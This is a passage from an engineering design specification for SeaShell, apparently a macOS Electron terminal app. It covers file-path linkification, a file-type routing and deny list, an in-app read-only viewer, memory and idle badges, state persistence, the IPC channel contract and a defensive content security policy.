**Reject** a run if: length > 1024; it matches `/^[a-z][a-z0-9+.\-]*:\/\//i`; it matches `/^\d[\d.]*$/` (version numbers); or the line has already produced 64 runs (bail on pathological lines).

**Classify.**
- starts with `/` → absolute
- `~` or `~/…` → expand against the `home` argument
- `./`, `../`, or any token containing `/` → resolve against the `cwd` argument
- bare token, only if it matches `/^[\w.@+\-]+\.[A-Za-z0-9]{1,8}$/` or is in `{Makefile, Dockerfile, Justfile, Rakefile, Gemfile, Brewfile, Procfile, LICENSE, README, CHANGELOG, NOTICE, AUTHORS}`
- everything else is dropped

False positives are expected here and are killed by the stat pass. That is the design: **only paths that stat get linkified.**

**Spaces — the exact contract.**
- *Supported at hover and double-click*: single- or double-quoted paths, and backslash-escaped spaces.
- *Not supported anywhere*: bare unquoted spaced paths. `/Users/j/My Docs/a.txt` is formally indistinguishable from prose.

There is **no double-click-only unique-prefix fallback.** An earlier draft extended a failed run through up to 4 following words while the last segment stayed a unique prefix among the parent directory's entries. That made hover and open disagree by construction — the exact failure the shared tokenizer exists to prevent — and would silently open the wrong file whenever two sibling entries shared a prefix boundary the user did not intend. The honest contract above is the contract.

### 8.3 Validation pipeline

Renderer → main: `fs:statBatch {cwd, candidates: string[] (≤ 256)}` → `{results: Array<{i, resolved, kind: 'file'|'dir'|'symlink'|'other', size, exec, dangling}>}` with misses omitted.

**Main's order is `resolve → lstat → realpath → DENY`**, not `resolve → realpath → lstat`:

```
1. path.resolve(cwd, candidate)        → reject non-absolute
2. fs.promises.lstat                   → determines EXISTENCE and kind, including 'symlink'
3. fs.promises.realpath (best effort)  → on ENOENT set dangling: true and still linkify
4. apply the §8.6 DENY rules to the REALPATH, never to the lstat path
```

The old order was wrong three ways: after `realpath` there are no symlinks left, so the following `lstat` could never report one; a **broken** symlink threw ENOENT at `realpath` and was never linkified even though `lstat` succeeds, contradicting goal 5 ("only paths that `lstat()` on disk"); and DENY evaluated pre-realpath would let a symlink to an `.app` or a `/dev` node through.

Renderer cache (`src/renderer/term/statcache.ts [pure]`): a `Map` with insertion-order eviction at **4096** entries, keyed on the **absolute resolved path** so a cwd change needs no invalidation. Positive TTL 60,000 ms; negative TTL 10,000 ms. Explicitly cleared on file-explorer refresh and on pane exit.

**Stat-storm guards** (dragging across a dense build log is the failure case):
- 32 ms coalescing window before an IPC batch fires
- **≤ 256 paths per batch** (the zod schema is the enforcement point — `z.array(z.string()).max(256)` — not a renderer-side convention), ≤ 20 batches/sec per terminal
- an in-flight `Set` so a path is never statted twice concurrently
- ≤ 64 candidates per logical line
- 60 ms trailing debounce on `provideLinks`

Scrolling alone triggers nothing, because `provideLinks` is hover-driven, not write-driven. Measured on this host: 500 × `fs.statSync` = 12.7 ms (~25 µs each), so a settled batch is essentially free.

### 8.4 The mouse-reporting conflict — resolution

Claude Code enables DECSET **1000 + 1006** only (press/release with SGR encoding; never 1002 or 1003), so `term.modes.mouseTrackingMode === 'vt200'` while it runs. xterm forwards mouse events on `mousedown` bound to `term.element` in the **bubble** phase.

**The rule**, evaluated at click time from `term.modes.mouseTrackingMode` (never from a guess about what is running):

| Mouse tracking | Plain double-click | Option + double-click | Cmd + double-click |
|---|---|---|---|
| `'none'` | **opens** the path | opens the path | reveals in Finder |
| anything else | forwarded to the PTY untouched | **opens** the path | reveals in Finder |

Two capture-phase listeners on the pane host `div` (`.seashell-pane-term`, a strict ancestor of `term.element`, so capture ordering is guaranteed):

```ts
// 1. Swallow only the SECOND press of an Option double-click.
host.addEventListener('mousedown', ev => {
  if (ev.button === 0 && ev.altKey && ev.detail === 2) { ev.preventDefault(); ev.stopPropagation(); term.focus() }
}, true)

// 2. Open.
host.addEventListener('dblclick', async ev => {
  const tracking = term.modes.mouseTrackingMode !== 'none'
  if (tracking && !ev.altKey) return                 // belongs to the app
  const cell = cellFromEvent(ev, term); if (!cell) return
  const hit = await resolveAt(paneId, cell); if (!hit) return
  ev.preventDefault(); ev.stopPropagation()
  term.select(hit.range.start.x - 1, hit.range.start.y - 1, hit.len)   // 0-based col/row
  if (ev.metaKey) seashell.open.revealInFinder(hit.abs)
  else            openRouted(paneId, hit.abs, hit.line, hit.col)
}, true)
```

> **Conflict resolved.** One draft swallowed *all* Alt+left-mousedowns at capture and set `macOptionClickForcesSelection: false`; another set it `true` to keep Option+drag selecting. Swallowing only `ev.detail === 2` gets both: the first press (detail 1) still reaches xterm, where `shouldForceSelection` (`isMac ? e.altKey && macOptionClickForcesSelection : e.shiftKey`) is true, so xterm starts a native selection and **sends no mouse report**; the second press is swallowed. Option+drag therefore still selects, and zero bytes reach the PTY during an Option+double-click. `altClickMovesCursor: false` is still mandatory to stop the arrow-key injection on an Option-click with an empty selection.

`cellFromEvent` mirrors xterm's internal `getCoords` using only public DOM:

```ts
const scr = term.element!.querySelector('.xterm-screen') as HTMLElement
const r = scr.getBoundingClientRect(), cs = getComputedStyle(scr)
const cw = r.width / term.cols, ch = r.height / term.rows
const col = clamp(Math.ceil((ev.clientX - r.left - parseFloat(cs.paddingLeft || '0')) / cw), 1, term.cols)
const row = clamp(Math.ceil((ev.clientY - r.top  - parseFloat(cs.paddingTop  || '0')) / ch), 1, term.rows)
return { x: col, y: row + term.buffer.active.viewportY }     // 1-based absolute
```

**Never cache `r`** — it drifts after a font-size change, a DPR change from an external monitor, or a pane resize. **Never apply a CSS transform to the terminal host.**

### 8.5 cwd resolution

**Primary — OSC 7**, from the ZDOTDIR shim (§6.2). OSC 7 is not handled internally by xterm 6.0.0 (it registers only 0, 1, 2, 4, 8, 10, 11, 12, 104, 110, 111, 112), so the ident is free:

```ts
term.parser.registerOscHandler(7, d => {
  try {
    const cwd = decodeURIComponent(new URL(d).pathname)
    paneCwd = cwd; paneCwdAt = Date.now()
    seashell.pty.reportCwd(paneId, cwd, paneCwdAt)   // pane:cwd — throttled to 1/prompt
  } catch {}
  return true
})
```

**The renderer must forward it, because every consumer is in main.** The `lsof` sampler must run only for panes with no OSC 7 in the last 5 s; `metrics:tick` returns a per-pane `cwd`; §11.1 persists `pane.cwd`; §6.4 restarts with the last observed cwd. Without `pane:cwd` main can neither gate `lsof` nor report the right cwd. Main stores `{cwd, at}` per pane, treats it as **authoritative for 5,000 ms**, and is the single source for all four consumers.

**Fallback — pid sampling.** One batched `execFile('/usr/sbin/lsof', ['-a', '-d', 'cwd', '-w', '-Fpn', '-p', pids.join(',')])` over all visible panes' shell pids, every **10,000 ms**, **only while the window is focused**, and only for panes whose main-side OSC 7 record is older than 5 s. Parse `p<pid>` then `n<path>` records. Measured on this host: 0.104 s for 1 pid, 0.194 s for 3 — batching is essentially free, and the 10 s interval keeps it under ~1% of one core while focused. Skipped entirely for panes with `labelIsCustom`.

**Final fallback**: the pane's spawn cwd, with cwd-relative candidates suppressed (only absolute and `~/` paths linkify).

### 8.6 File-type routing

Routing decisions are made in **main**, never in the renderer, by **one exported function** used by `fs:probe`, `fs:readTextFile`, and the double-click router alike:

```ts
// src/main/fs/route.ts  [pure]
export function classify(path: string, head: Buffer, size: number):
  { binary: boolean, route: 'viewer' | 'os' | 'reveal' | 'too-large' }
```

A single implementation is mandatory because an earlier draft had two disagreeing binary tests — §8.6 sniffed 8192 bytes and called a file binary on any `0x00`, a magic-number hit, **or** >30% non-text bytes with invalid UTF-8, while §9's viewer guard was only "first 8 KiB contains `0x00`". A latin-1 log with no NULs routed to the viewer by one rule and to the default app by the other.

**The constants are pinned once, here, and referenced everywhere else:**

```
SNIFF_BYTES                = 8_192
VIEWER_MAX_BYTES           = 8 * 1024 * 1024     // refuse outright
VIEWER_HIGHLIGHT_MAX_BYTES = 2 * 1024 * 1024     // plain text above this
VIEWER_MAX_LINES           = 200_000
VIEWER_MAX_LINE_CHARS      = 5_000
```

| Class | Destination | Members |
|---|---|---|
| **Directory** | File explorer — never Finder | Expand the sidebar if collapsed, expand ancestors, select and scroll the node into view. |
| **Viewer** (read-only, in-app) | `viewer` | `.txt .text .log .md .markdown .mdx .rst .adoc .json .jsonc .json5 .jsonl .ndjson .yaml .yml .toml .ini .cfg .conf .env .properties .xml .csv .tsv .js .mjs .cjs .jsx .ts .tsx .mts .cts .py .pyi .rb .go .rs .c .h .cc .cpp .cxx .hpp .hh .m .mm .swift .java .kt .kts .scala .cs .php .pl .lua .r .jl .dart .zig .nim .ex .exs .erl .hs .clj .cljs .sql .graphql .gql .proto .sh .bash .zsh .fish .ps1 .vim .el .gradle .cmake .mk .bzl .tf .tfvars .hcl .patch .diff .lock`; plus the extensionless basenames `Makefile Dockerfile Justfile Rakefile Gemfile Brewfile Procfile LICENSE README CHANGELOG NOTICE AUTHORS`; plus `.gitignore .gitattributes .npmrc .nvmrc .editorconfig .zshrc .bashrc .profile` |
| **DENY** — reveal in Finder, **never** `openPath` | `reveal` | `.app .command .workflow .scpt .scptd .terminal .webloc .url .inetloc .desktop .pkg .mpkg .dmg .jar .action .prefPane .qlgenerator .saver .plugin .bundle .osax .kext .appex`; **plus** any file with `mode & 0o111` whose extension is not on the viewer list or the document list; **plus** any FIFO, socket, character device, or block device; **plus** anything whose **realpath** is under `/dev` |
| **Default app** | `shell.openPath` | Everything else: `.pdf .xlsx .docx .pptx .pages .numbers .key .png .jpg .jpeg .heic .gif .svg .mp4 .mov .m4a .mp3 .zip .tar .gz …` |

**Extensionless / unknown sniff** (`classify`, first `SNIFF_BYTES`): magic-number match on `%PDF-`, `\x89PNG`, `GIF8`, `\xFF\xD8\xFF`, `PK\x03\x04`, `\x7FELF`, `\xCF\xFA\xED\xFE` → binary; any `0x00` byte → binary; else if > 30% of bytes fall outside `{0x09, 0x0A, 0x0D, 0x20–0x7E}` **and** the buffer is not valid UTF-8 → binary. Binary falls through to the DENY / default-app rules; text goes to the viewer.

When the tokenizer extracted a `:line:col` suffix and the route is `viewer`, the viewer scrolls that line to 1/3 from the top and highlights it.

A non-empty string returned by `shell.openPath` is surfaced verbatim via `ui:notice` (`OPEN_FAILED`).

---

## 9. In-app viewer

Read-only, permanently. It opens as a right-hand panel over the grid (not a pane), 50% width by default, resizable. Opening it sets `appFocusZone = 'viewer'` (§5.5); it closes with **Escape** (which restores the previous zone) or **⌘W** while that zone is active.

**Guards — three tiers, using the §8.6 constants and the shared `classify()`:**

| Condition | Result |
|---|---|
| `size > VIEWER_MAX_BYTES` (8 MiB) | Refuse. Offer **Open in default app** / **Reveal in Finder**. |
| `classify()` says binary | `EBINARY`. Auto-route to `shell.openPath`, close the panel, notice `2.4 MB binary file — opening in the default app`. |
| `size > VIEWER_HIGHLIGHT_MAX_BYTES` (2 MiB) **or** any line > `VIEWER_MAX_LINE_CHARS` (5,000) | Open as plain text; highlighting **and** word-wrap disabled; banner explains why. |
| otherwise | Highlighted. |

An earlier draft wrote the third tier as "`size > 2 MiB` (equivalently > 512 KiB after the highlight budget check)" — 2 MiB and 512 KiB are unrelated numbers with no stated relationship; the parenthetical is deleted. It also carried a separate `> 200,000` lines truncation tier; since > 8 MiB is refused and > 2 MiB is already unhighlighted, that tier fires only in a very narrow band, so `VIEWER_MAX_LINES` now applies as a hard truncation inside the plain-text path with a banner rather than as its own guard branch.

`fs:probe` returns `route: 'too-large'` when `size > VIEWER_MAX_BYTES`, and `fs:readTextFile` returns `ETOOBIG` against the same constant — both read it from `route.ts`, so the number appears once in the codebase.

**Highlighting.** `shiki@4.3.1` via the fine-grained path: `createHighlighterCore` from `shiki/core`, **`createJavaScriptRegexEngine()`**, langs imported individually from `@shikijs/langs/*`, theme **`github-dark` only** from `@shikijs/themes/*`. One long-lived singleton; ~14 langs loaded lazily on first use.

Two deliberate choices there:

- **No WebAssembly.** `createOnigurumaEngine(import('shiki/wasm'))` calls `WebAssembly.instantiate`, and since Chrome 97 a page with a CSP that lacks `'wasm-unsafe-eval'` in `script-src` has wasm compilation and instantiation blocked outright — which would mean the entire §9 pipeline silently never runs. The alternatives were adding `'wasm-unsafe-eval'` or dropping wasm. The JS engine wins: it measured 5,866 ms against oniguruma's 3,697 ms on the same 10,003-line file, and with the `requestIdleCallback` chunking below that difference is invisible, so it buys a strictly tighter CSP (`script-src 'self'`) and a smaller payload for no perceptible cost. A `dom` test instantiates the highlighter and asserts a non-empty token array, so a regression here fails CI rather than shipping a viewer with no colors.
- **One theme.** `github-light` is gone. §1's non-goals say SeaShell ships exactly one theme and §4.4 fixes the app at the Homebrew-derived palette, so a light theme was unreachable dead configuration that doubled the theme payload. A light viewer is a design change requiring approval, not an implementation-time decision.

**Never call `codeToHtml`.** Measured on this exact host: a 10,003-line / 446 KB TypeScript file tokenizes in **3,697 ms** (oniguruma) / **5,866 ms** (JS engine), and the corresponding `codeToHtml` output is 4.18 MB of HTML.

The rendering pipeline is therefore:

1. Render plain monospace text within one frame.
2. Tokenize **500 lines per chunk** (~190 ms measured) inside `requestIdleCallback`, threading `result.grammarState` from chunk *N* into chunk *N+1*'s options. This was verified byte-identical to whole-file tokenization across a block comment and a template literal spanning a chunk boundary.
3. Pass `tokenizeMaxLineLength: 2000` and `tokenizeTimeLimit: 500` so minified files degrade to plain text instead of hanging.
4. Build DOM with `document.createElement` + `el.style.color` from `codeToTokens`. **Never `innerHTML`** — this is untrusted file content and `innerHTML` is an injection sink. (Note this is *not* a CSP argument: `style-src` governs `<style>` elements and `style=` attributes parsed from markup, not CSSOM property writes such as `el.style.color`. See §13.1.)
5. Virtualize to visible lines + 50 rows above and below.

Header shows the basename, full path (click to copy), byte size, line count, detected language, and buttons **Open in default app** / **Reveal in Finder** / **Copy path**. **There is no in-viewer search in v1** — ⌘F was cut along with the in-pane find bar (§3, §5.5), and the browser's own find is unavailable in a sandboxed renderer, so search is honestly absent rather than half-present. Listed in §19.

---

## 10. Memory and idle awareness

Design decision 7 asked for three things: total RSS across all panes in the status bar, per-pane RSS above a threshold, and a quiet "idle" badge on stale Claude panes. §10 delivers exactly those three and nothing else. Everything the earlier draft built around them — a bundled C sweep helper, physical-footprint accounting, a system memory gauge with compressor and swap readouts, a composite three-way color rule, a rate-limited toast, a heaviest-panes sheet, and a CPU-calibrated three-state machine — is preserved verbatim in §19 as the documented v1.1 upgrade path, to be built only if v1 proves insufficient in daily use.

### 10.1 The sweep

One `execFile` every tick, no bundled binary:

```
/bin/ps -axo pid=,ppid=,pgid=,tpgid=,uid=,tty=,rss=,time=,comm=
```

That yields everything v1 consumes: **ppid** (subtree membership, §6.5), **tty** (the §6.5 tty arm — `ttys004` style, or `??` for no controlling terminal), **pgid** (the kill ladder), **tpgid** (foreground pgid, for the close-confirmation "foreground process is not its own shell" test), **uid** (the mandatory same-user filter), **rss**, and cumulative **cpu time**.

**Cost, measured on this host: 0.12 s wall for all 751 processes** — 2.4% of one core, i.e. ~0.2% of twelve, at a 5 s interval. That is 11× more than a hand-written libproc helper would cost, and it is still negligible.

> **Conflict resolved, and reversed from an earlier draft.** That draft shipped `Contents/Resources/seashell-procsweep`, a ~60-line universal C binary compiled in `postinstall`, added to `extraResources`, `chmod`'d and `lipo`-asserted in `afterPack`, gated in CI, and signed and notarized as part of the bundle — plus `procsweep.ts`, a TSV fixture, an error-handling row and a risk row. That is five or six moving parts across the build, packaging and signing pipeline — the riskiest area of the project, where three of the five blocker risks live — bought for a status-bar number, and it made `clang` a hard build dependency on every machine and in CI. Cutting it deletes one bundled executable, one postinstall compile step, two `afterPack` assertions, one CI gate, and one notarized artifact. The *only* thing lost is `phys_footprint`, and §19 records precisely why and when to buy it back.

**Poll interval: 5,000 ms while the window is visible, 30,000 ms when hidden or occluded** (`browser-window-blur` plus `webContents` occlusion).

Pane membership is `paneProcs(pane)` from §6.5, including its `/^ttys\d+$/` guard and its uid filter. Those guards are not optional here either: 740 of 751 rows on this host have tty `??`.

### 10.2 The per-pane number

**Per pane, display `Σ rss` over the pane's process set**, shown on the title bar at **≥ 200 MB**, and summed across all panes into one status-bar element:

```
panes (Σ RSS) 1.4 GB
```

with the tooltip:

> Sum of resident set size across every process in every pane. Shared pages are counted once per process, so this is an upper bound. It is not a share of system RAM.

**Never present the pane total as a fraction of system memory.** The status bar renders this as its own left-aligned segment with its own label; there is no adjacent system-memory figure to invite the comparison (the system gauge is deferred, §19).

**Colour thresholds are derived, not hardcoded**, because this ships as a universal binary that will run on 8, 16, 24, 36 and 64 GB machines. On a 64 GB M-series machine a fixed 6 GB amber sits on permanently; on an 8 GB machine 6 GB is already catastrophic:

```
amber at paneTotal ≥ max(0.375 * hw.memsize, 2 GB)
red   at paneTotal ≥ max(0.625 * hw.memsize, 4 GB)
```

On this 16 GB host that reproduces exactly the 6 GB / 10 GB the earlier draft hardcoded. The derived values are printed in the tooltip so the numbers are inspectable. **SeaShell never kills anything automatically**, and there is no toast and no heaviest-panes sheet in v1 — the per-pane badge already answers "which session do I kill".

> **RSS is known to be imperfect and it is what decision 7 asked for.** Measured on five live forgotten Claude Code sessions on this machine, RSS and physical footprint disagree by up to 2.8× and rank the panes in a *different order* (pid 69559: 274 MiB RSS / 766 MB footprint; pid 66274: 393 MiB RSS / 327 MB footprint). RSS excludes compressed and swapped pages, excludes IOAccelerator memory, and double-counts shared clean `__TEXT` across panes mapping the same 254 MB `claude` binary. The full argument and the measurement table are retained in §19. If pane ordering by RSS proves misleading in real use, §19 is the upgrade.

### 10.3 Busy and idle — bytes only

Both badges are derived **in the renderer, from byte activity alone, with zero process data**:

```
busy  =  now - lastOutputTs < 2000 ms                      // lastOutputTs updated in onData
idle  =  now - lastInputTs >= 15 min  &&  !busy            // lastInputTs updated on keystroke/paste,
                                                           // initialized to spawnTs (§6.3)
```

**The spinner is the signal.** Claude Code's `esc to interrupt` animation guarantees output while a turn is running, so a thinking pane reads busy even when it is network-bound and burning no CPU; a Claude pane sitting at its input box emits nothing and reads not-busy. The earlier draft's own busy/idle section conceded this — "the discriminating signal is `bytesThisTick > 0`" — and then added a `e_tpgid` foreground-pgid arm and a `cpuDelta / windowNs > 0.08` arm on top, reaching a conclusion byte activity already reaches, at the cost of a process-table dependency for a badge.

Cut with it: the PROMPT / BUSY / WAITING three-state machine, the 0.08 CPU threshold, the `e_tpgid` dependency **for badges**, and the state-machine unit test. `tpgid` and `tty` are still swept, because §6.5's kill ladder and its close-confirmation genuinely need process identity — that is the one place process data earns its keep.

The CPU-calibrated version, including the precise `cpuDelta` definition needed to make it correct across a changing process set, is specified in §19.

---

## 11. Persistence

**Location**: `~/Library/Application Support/SeaShell/state.json` (`app.getPath('userData')` with `productName: "SeaShell"`).

### 11.1 Schema (`schemaVersion: 1`)

```jsonc
{
  "schemaVersion": 1,
  "savedAt": "2026-07-31T05:12:03.114Z",
  "window": { "x": 0, "y": 0, "width": 1440, "height": 900,
              "sidebarWidth": 260, "sidebarCollapsed": false },
  "activeTabId": "b2f1…",
  "tabs": [{
    "id": "b2f1…",
    "name": "seashell",
    "nameIsCustom": false,
    "cwd": "/Users/joshwald/Desktop/seashell",
    "zoomedPaneId": null,
    "activePaneId": "p5…",
    "root": {
      "type": "row", "ratios": [0.5, 0.5],
      "children": [
        { "type": "col", "ratios": [0.6, 0.4],
          "children": [ {"type":"pane","id":"p1…"}, {"type":"pane","id":"p4…"} ] },
        { "type": "col", "ratios": [1],
          "children": [ {"type":"pane","id":"p2…"} ] }
      ]
    },
    "panes": {
      "p1…": { "label": "seashell", "labelIsCustom": false,
               "command": { "file": "/bin/zsh", "args": ["-l"], "runAfterStart": null },
               "cwd": "/Users/joshwald/Desktop/seashell", "cols": 96, "rows": 28 }
    }
  }]
}
```

`runAfterStart` is `"claude"`, the user's command string, or `null`. **No PTY state, no pid, no scrollback, no env.** There is no `pristine` field (§5.2). Ratios are clamped to `[0.05, 0.95]` and each internal node's ratios must sum to 1 ± 1e-9. Zod `.superRefine` asserts every `pane.id` in the tree appears exactly once in `panes` and vice versa, and that tree depth is exactly `row → col → pane`.

`pane.cwd` is **not stored by the renderer**; it is read from main's live cwd map (§8.5) at serialization time.

### 11.2 Restore behaviour

**First run.** If `state:load` returns `recovered: 'first-run'` (no file on disk — a missing file is not a failure), SeaShell creates one tab with `cwd = os.homedir()`, `name = basename(cwd)`, and **one live pane spawned immediately** with `/bin/zsh -l`. This is the only case in which SeaShell spawns a PTY without a click, and it is stated explicitly so it is not misread as violating design decision 8 — that decision is about not auto-running *restored* sessions. An app that opens to zero tabs, or to a Restore card for a pane that never existed, is wrong in both directions.

**Restore.** On any other launch, draw the full grid, tab names, labels, and sidebar state. **Auto-run nothing.** Every restored pane renders a centered card:

```
    zsh — ~/Desktop/seashell
    [ ▸ Restore ]
```

`claude` panes read `zsh + claude — <cwd>`. A tab-level `Restore all panes in this tab` button exists; there is deliberately no app-level "restore everything". Restore uses the §6.1 cwd walk-up, so a pane whose saved directory no longer exists starts in the nearest surviving ancestor with a one-line notice rather than failing forever.

This is the same component as the post-exit restart overlay (§6.4): a pane is *unstarted* or *dead*; both render a restart button; neither auto-runs.

**Window geometry is validated, never trusted.** The saved rect is restored only after intersecting it with `screen.getDisplayMatching(rect).workArea`:

```
if (overlapArea < 0.5 * windowArea) or (rect intersects no display):
    center on screen.getPrimaryDisplay(), keeping the saved size clamped to workArea
```

Without this, unplugging an external monitor — a documented part of this user's setup — reopens the window fully off-screen with no way to reach it.

### 11.3 Single instance, atomic write, recovery

**Single-instance lock, first.** `app.requestSingleInstanceLock()` at startup; on failure, focus the existing window and `app.quit()`. Handle `second-instance` by focusing. This is not optional for this user: two SeaShell instances both debounce-writing `state.json` is last-writer-wins, so the second instance's layout would silently erase the first's on quit — and the target user has a documented habit of leaving sessions running and forgetting them.

**Write**: `open(state.json.tmp-<pid>-<ts>, 'w')` → `write` → `fh.sync()` → `close` → `rename(tmp → state.json)` → **fsync the containing directory**:

```ts
const dh = await fs.promises.open(userDataDir, 'r'); await dh.sync(); await dh.close()
```

`fh.sync()` guarantees the temp file's data reached disk; it says nothing about the directory entry created by the `rename`. Without the directory fsync the rename itself is not durable, which is precisely the crash-during-write scenario risk 37 exists to cover. The `unit` state tests assert this call order against a mocked `fs`.

**Save triggers are enumerated, not "any layout change".** Debounced 2,000 ms after any of: tab add / remove / rename / reorder; pane add / remove / label edit; divider drag **end**; zoom toggle; sidebar width or collapse change; window move or resize **end**; active-tab change. Forced synchronously on `before-quit`.

**`pane.cwd` is explicitly not a trigger.** It changes on every `cd` via OSC 7; with a busy pane that would be a state-file write every couple of seconds, forever, on a machine that swaps. It is read from main's live map at serialization time instead (§11.1).

**Load ladder**: read → `JSON.parse` → `zod.safeParse`. There is **no `migrate.ts`** — exactly one schema version exists and the app has zero users; an ordered migration list `[{from: 1, to: 2, fn}]` is machinery for a problem that does not exist yet. On `schemaVersion !== 1`, or any parse or validation failure, `rename` the bad file to `state.corrupt-<ISO>.json` (one line, and it is the only debuggable artifact), log, return defaults, and notice. **The bad file is never deleted.** The `.bak` rotation and the retry-against-`.bak` ladder are also gone: the file's entire contents are a recreatable window layout, not user data, and the atomic write already prevents the truncated-file case.

`state:save` failure (ENOSPC / EACCES) is a real, reachable case and gets a `ui:notice` with a **Retry** action (§14). The app never blocks quit on it.

---

## 12. IPC contract

Every `invoke` handler runs `zod@4.4.3.safeParse` on its payload in `src/main/ipc-router.ts` — the single registration point — and returns `{ok: false, code, message}` rather than throwing. `paneId` and `tabId` are UUIDv4.

| Channel | Kind | Request | Response / payload |
|---|---|---|---|
| `pty:spawn` | invoke | `{paneId, file: string, args: string[], cwd: string, cols: 1–2000, rows: 1–500, runAfterStart: string\|null}` | `{ok:true, pid, cwdFallback?: string}` \| `{ok:false, code:'ENOENT'\|'EACCES'\|'ECWD'\|'ETTY'\|'ELIMIT', message}` |
| `pty:write` | send | `{paneId, data: string}` | — |
| `pty:resize` | send | `{paneId, cols, rows}` | — |
| `pty:ack` | send | `{paneId, bytes: number, epoch: number}` | — |
| `pty:kill` | invoke | `{paneId}` | `{ok: boolean, survivors: Array<{pid: number, comm: string}>}` (runs the full §6.5 ladder) |
| `pty:data` | on | — | `{batches: Array<{paneId, bytes: Uint8Array}>}` |
| `pty:exit` | on | — | `{paneId, exitCode: number, signal: number\|null, spawnedAt, ranMs}` — **suppressed when `session.closing`** (§6.4) |
| `pane:cwd` | send | `{paneId, cwd: string, ts: number}` | — from the renderer's OSC 7 handler, throttled to one per prompt (§8.5) |
| `fs:readDir` | invoke | `{path, respectGitignore: boolean}` | `{ok:true, entries: Array<{name, isDir, isSymlink, size, mtimeMs, ignored}>, truncated, denied, cycle}` |
| `fs:statBatch` | invoke | `{cwd, candidates: string[] (≤256)}` | `{results: Array<{i, resolved, kind:'file'\|'dir'\|'symlink'\|'other', size, exec, dangling}>}` (misses omitted) |
| `fs:probe` | invoke | `{path}` | `{exists, isDir, size, ext, route:'viewer'\|'os'\|'reveal'\|'too-large'\|'binary'}` (`too-large` = `size > VIEWER_MAX_BYTES`, §8.6) |
| `fs:readTextFile` | invoke | `{path, maxBytes: number}` | `{ok:true, text, lines, size, truncated}` \| `{ok:false, code:'EBINARY'\|'ETOOBIG'\|'ENOENT'\|'EACCES'}` |
| `open:withDefaultApp` | invoke | `{path}` | `{ok: boolean, error?: string}` (from `shell.openPath`) |
| `open:revealInFinder` | invoke | `{path}` | `{ok: true}` |
| `open:externalHttp` | invoke | `{url}` | `{ok: boolean}` — **rejects anything not `http:`/`https:`**; used only by the OSC 8 `linkHandler` |
| `clip:read` | invoke | `{}` | `{text: string}` — **reachable only from the ⌘V menu handler** |
| `clip:write` | invoke | `{text: string (≤ 100_000 chars)}` | `{ok}` — the cap is enforced **in main**, not renderer-side |
| `metrics:tick` | on | — | `{panes: Array<{paneId, rssBytes, procCount, foregroundProcess, cwd}>, thresholds: {amberBytes, redBytes}}` |
| `state:load` | invoke | `{}` | `{state, recovered:'none'\|'first-run'\|'defaults'}` |
| `state:save` | invoke | `{state}` | `{ok:true}` \| `{ok:false, code, message}` |
| `app:getPaths` | invoke | `{}` | `{home, userData, defaultShell, cwdOfLaunch}` — `cwdOfLaunch` is **diagnostic only**; no feature reads it (§5.5) |
| `app:getTerminalFont` | invoke | `{}` | `{regular: ArrayBuffer, italic: ArrayBuffer} \| null` |
| `app:pickFolder` | invoke | `{}` | `{ok:true, path}` \| `{ok:false, code:'ECANCEL'}` — `dialog.showOpenDialog({properties:['openDirectory']})` |
| `app:beforeQuit` | on | — | `{}` — main has already `preventDefault`ed and is awaiting `app:quitReply` |
| `app:quitReply` | invoke | `{state, panes: Array<{tabName, paneIndex, label, command, busy, rssBytes, procCount, busyMs, idleMs}>}` | `{ok:true}` — 2,000 ms timeout in main (§6.5) |
| `ui:command` | on | — | `{command: string}` — menu accelerator dispatch |
| `ui:notice` | on | — | `{id: string, level:'info'\|'warn'\|'error', code: string, message: string, actions?: Array<{id, label}>, dedupeKey?: string, ttlMs?: number}` |
| `ui:noticeAction` | send | `{noticeId, actionId}` | — |

**`ui:notice` is not optional.** At least nine rows of §14 describe a message whose trigger lives in main — `shell.openPath` returning a non-empty string, "N processes could not be reaped", the `ps` sweep failing, `lsof` failing, a corrupt state file, a `state:save` failure, a DENY-list block, a spawn cwd fallback, an IPC handler throw. `state:load` carries `recovered` and `pty:kill` carries `survivors`, but nothing else had a transport, which made most of the error table unimplementable as written. Every §14 row now names the `code` it emits, so the table and the channel are checkable against each other in a test.

### Preload surface

One frozen object. `ipcRenderer` itself is never exposed, and **no function takes a channel name**.

```ts
contextBridge.exposeInMainWorld('seashell', {
  pty:       { spawn, kill, write, resize, ack, reportCwd, onData, onExit },
  fs:        { readDir, statBatch, probe, readTextFile },
  open:      { withDefaultApp, revealInFinder, externalHttp },
  clipboard: { readText, writeText },
  state:     { load, save },
  app:       { getPaths, getTerminalFont, pickFolder, onBeforeQuit, quitReply, onCommand },
  metrics:   { onTick },
  notice:    { onNotice, action },
})
```

`clipboard` is mandatory, not a convenience: §5.5 specifies ⌘C → `clipboard.writeText` and ⌘V → `term.paste(clipboard.readText())`, and the renderer is `sandbox: true` with `nodeIntegration: false`, so it cannot reach Electron's `clipboard` module by any other route. Without it, copy and paste are unbuildable. `clipboard.readText` is wired **only** to the ⌘V menu handler and is never handed to an addon.

**Deliberately absent**: `fs`, `path`, `os`, `child_process`, `require`, `process.env`, `shell.openExternal` (only the http-gated `externalHttp`), any generic `invoke(channel, …)`, any write/delete/rename/mkdir, and any way to set a PTY's environment.

---

## 13. Security posture

A terminal renders untrusted bytes produced by arbitrary programs. Escape sequences, OSC payloads, file contents in the viewer, and filenames from cloned repositories all land in the renderer. The boundary is drawn so that one renderer injection bug is not arbitrary read/write.

### 13.1 The CSP

```
default-src 'none';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self';
connect-src 'none'
```

**`'unsafe-inline'` in `style-src` is required, not a lapse.** `style-src 'self'` with no `'unsafe-inline'`, nonce or hash breaks xterm.js completely. Verified in the `@xterm/xterm@6.0.0` tarball: `src/browser/Viewport.ts:79` unconditionally calls `createElement('style')` and assigns `.textContent` for scrollbar theming — **for every terminal, regardless of renderer** — and `src/browser/renderer/dom/DomRenderer.ts:138` and `:158` create two more (`_dimensionsStyleElement`, `_themeStyleElement`). Chromium blocks the contents of a dynamically inserted `<style>` element under `style-src` without one of those three allowances, and `grep -rn nonce package/src package/typings` on xterm 6.0.0 returns **zero hits**, so there is no nonce hook to use (upstream xterm.js issues #1335, #4133, #4445). This is not a theoretical path: §4.5 makes the DOM renderer a reachable steady state for the third-and-older tab and the WebGL-context-loss fallback.

`script-src` stays `'self'` with **no `'wasm-unsafe-eval'`**, because §9 uses shiki's JS regex engine and SeaShell instantiates no WebAssembly anywhere.

